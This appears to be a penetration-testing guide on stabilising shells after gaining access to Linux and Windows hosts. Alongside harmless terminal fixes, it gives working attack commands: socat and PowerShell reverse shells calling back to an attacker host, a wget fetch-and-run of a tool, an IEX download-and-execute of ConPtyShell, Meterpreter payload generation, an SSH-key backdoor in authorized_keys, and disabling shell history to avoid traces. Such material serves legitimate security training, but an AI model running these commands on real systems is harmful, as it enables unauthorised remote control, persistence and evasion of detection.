# Shell Stabilization - Complete Guide

## 📋 Overview

After gaining initial access, **shell stabilization** is critical before proceeding with enumeration or privilege escalation. An unstable shell can disconnect, lose functionality, or fail to execute commands properly.

---

## 🎯 Why Stabilize Shells?

### Problems with Unstable Shells
- ❌ No tab completion
- ❌ No command history (arrow keys)
- ❌ No text editors (vim, nano)
- ❌ Ctrl+C kills the shell
- ❌ No job control
- ❌ Limited terminal size
- ❌ No proper error handling

### Benefits of Stable Shells
- ✅ Full TTY functionality
- ✅ Tab completion works
- ✅ Command history accessible
- ✅ Can use text editors
- ✅ Ctrl+C works properly
- ✅ Job control (bg, fg)
- ✅ Proper terminal size
- ✅ Better error messages

---

## 🔄 Shell Stabilization Workflow

```
┌─────────────────────────────────────────┐
│ 1. Gain Initial Shell                   │
│    └─ Reverse/bind shell established    │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 2. Identify Shell Type                  │
│    └─ Linux or Windows?                 │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 3. Spawn PTY (Linux)                    │
│    └─ Python, script, or socat          │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 4. Background and Configure             │
│    └─ stty settings                     │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 5. Set Environment Variables            │
│    └─ TERM, SHELL, PATH                 │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 6. Verify Functionality                 │
│    └─ Test tab, arrows, Ctrl+C          │
└─────────────────────────────────────────┘
```

---

## 🐧 Linux Shell Stabilization

### Method 1: Python PTY (Most Common)

**Step-by-step**:

```bash
# Step 1: Spawn bash with Python PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# OR
python -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background the shell (Ctrl+Z)
# Press: Ctrl+Z

# Step 3: Configure terminal
stty raw -echo; fg

# Step 4: Reset terminal (if needed)
reset

# Step 5: Set environment variables
export TERM=xterm
export SHELL=/bin/bash

# Step 6: Fix terminal size (optional)
stty rows 38 columns 116
```

**One-liner version**:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")' && export TERM=xterm
# Then: Ctrl+Z
stty raw -echo; fg
```

### Method 2: Script Command

```bash
# Spawn bash using script
/usr/bin/script -qc /bin/bash /dev/null

# Then follow steps 2-6 from Method 1
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### Method 3: Socat (Full TTY)

**On attacker machine**:
```bash
# Create listener with PTY
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

**On victim machine**:
```bash
# Connect back with PTY
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$LHOST:4444
```

**Transfer socat to victim** (if not installed):
```bash
# On attacker
python3 -m http.server 80

# On victim
wget http://$LHOST/socat -O /tmp/socat
chmod +x /tmp/socat
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$LHOST:4444
```

### Method 4: Expect

```bash
# Spawn shell with expect
expect -c 'spawn /bin/bash; interact'
```

### Method 5: Perl

```bash
# Spawn shell with Perl
perl -e 'exec "/bin/bash";'
```

### Method 6: Ruby

```bash
# Spawn shell with Ruby
ruby -e 'exec "/bin/bash"'
```

### Method 7: Lua

```bash
# Spawn shell with Lua
lua -e "os.execute('/bin/bash')"
```

---

## 🪟 Windows Shell Stabilization

### Method 1: PowerShell Upgrade

**From cmd.exe to PowerShell**:
```cmd
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('$LHOST',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Method 2: Meterpreter Upgrade

**From basic shell to Meterpreter**:

```bash
# On attacker - start multi/handler
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT 4444; exploit"

# On victim - generate and execute payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f exe -o shell.exe

# Transfer and execute shell.exe
```

### Method 3: ConPtyShell (Full Interactive)

**On attacker**:
```bash
# Clone ConPtyShell
git clone https://github.com/antonioCoco/ConPtyShell
cd ConPtyShell

# Start listener
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```

**On victim**:
```powershell
# Execute ConPtyShell
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell $LHOST 3001
```

### Method 4: rlwrap (Linux attacker side)

**Wrap netcat listener**:
```bash
# Install rlwrap
sudo apt install rlwrap

# Use with netcat
rlwrap nc -nvlp 443

# Now you have:
# - Command history (arrow keys)
# - Line editing
# - Tab completion (limited)
```

---

## 🎯 Terminal Size Configuration

### Check Current Terminal Size

**On your attacker machine**:
```bash
stty size
# Output: rows columns (e.g., 38 116)
```

### Set Terminal Size in Victim Shell

```bash
# After stabilizing shell
stty rows 38 columns 116

# Or dynamically
stty rows $(tput lines) columns $(tput cols)
```

### Why Terminal Size Matters
- Proper text editor display
- Correct output formatting
- Tools like `less` work properly
- Better readability

---

## 🔍 Shell Type Detection

### Identify Current Shell

```bash
# Check shell type
echo $SHELL
echo $0

# Check available shells
cat /etc/shells

# Check Python version
python --version
python3 --version

# Check for socat
which socat

# Check for script
which script
```

---

## ⚙️ Environment Variables

### Essential Variables to Set

```bash
# Terminal type
export TERM=xterm
export TERM=xterm-256color  # For color support

# Shell
export SHELL=/bin/bash

# Path (if limited)
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Language/Locale
export LANG=en_US.UTF-8

# History
export HISTFILE=/dev/null  # Don't save history (OPSEC)
```

### Check Current Environment

```bash
# View all environment variables
env

# View specific variable
echo $TERM
echo $SHELL
echo $PATH
```

---

## 🚨 Common Issues and Solutions

### Issue 1: "python: command not found"

**Solution**: Try python3 or other methods
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# OR
/usr/bin/script -qc /bin/bash /dev/null
```

### Issue 2: Shell dies when pressing Ctrl+C

**Solution**: Properly configure stty
```bash
# After spawning PTY
# Ctrl+Z
stty raw -echo; fg
```

### Issue 3: No tab completion

**Solution**: Ensure PTY is spawned and TERM is set
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

### Issue 4: Weird characters when using arrow keys

**Solution**: Shell not properly stabilized
```bash
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### Issue 5: Can't use vim/nano

**Solution**: Set TERM variable
```bash
export TERM=xterm
```

### Issue 6: Terminal size is wrong

**Solution**: Set rows and columns
```bash
# On attacker, check size
stty size

# On victim, set size
stty rows 38 columns 116
```

---

## 💡 Pro Tips

### 1. Stabilize Immediately
```bash
# First thing after getting shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### 2. Use rlwrap for Windows Shells
```bash
# On attacker
rlwrap nc -nvlp 443
```

### 3. Save Stabilization Commands
```bash
# Create alias
alias stab='python3 -c "import pty; pty.spawn(\"/bin/bash\")"'
```

### 4. Test Functionality
```bash
# After stabilization, test:
# - Tab completion: ls /et<TAB>
# - Arrow keys: <UP> for history
# - Ctrl+C: Should not kill shell
# - vim: vim test.txt
```

### 5. Multiple Shells
```bash
# Keep multiple shells open
# - One for enumeration
# - One for file transfers
# - One for monitoring
```

### 6. Upgrade to SSH
```bash
# If possible, add SSH key for stable access
mkdir -p ~/.ssh
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Then SSH in
ssh user@$IP
```

---

## 📊 Stabilization Decision Tree

```
Got Shell?
    │
    ├─ Linux?
    │   ├─ Python available?
    │   │   └─ Use Python PTY ✓
    │   ├─ Script available?
    │   │   └─ Use script command ✓
    │   ├─ Socat available?
    │   │   └─ Use socat ✓
    │   └─ None available?
    │       └─ Try Perl/Ruby/Lua
    │
    └─ Windows?
        ├─ PowerShell available?
        │   └─ Upgrade to PowerShell ✓
        ├─ Can upload files?
        │   └─ Use ConPtyShell ✓
        └─ Limited access?
            └─ Use rlwrap on attacker side ✓
```

---

## 🔗 Related Resources

- [Reverse Shells](./Reverse-Shells.md)
- [Bind Shells](./Bind-Shells.md)
- [Web Shells](./Web-Shells.md)
- [File Transfer Methods](../07-File-Transfers/)
- [Post-Exploitation](../04-Post-Exploitation/Situational-Awareness.md)

---

## 📚 Quick Reference

### Linux Stabilization (Quick)
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### Windows Stabilization (Quick)
```bash
# On attacker
rlwrap nc -nvlp 443
```

### Socat Full TTY (Quick)
```bash
# Attacker
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Victim
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$LHOST:4444
```

---

## ✅ Stabilization Checklist

After stabilization, verify:

- [ ] Tab completion works
- [ ] Arrow keys work (command history)
- [ ] Ctrl+C doesn't kill shell
- [ ] Can use text editors (vim/nano)
- [ ] Terminal size is correct
- [ ] TERM variable is set
- [ ] Can run interactive programs
- [ ] Job control works (bg/fg)

---

**Remember**: A stable shell is the foundation for successful post-exploitation. Take the time to stabilize properly!
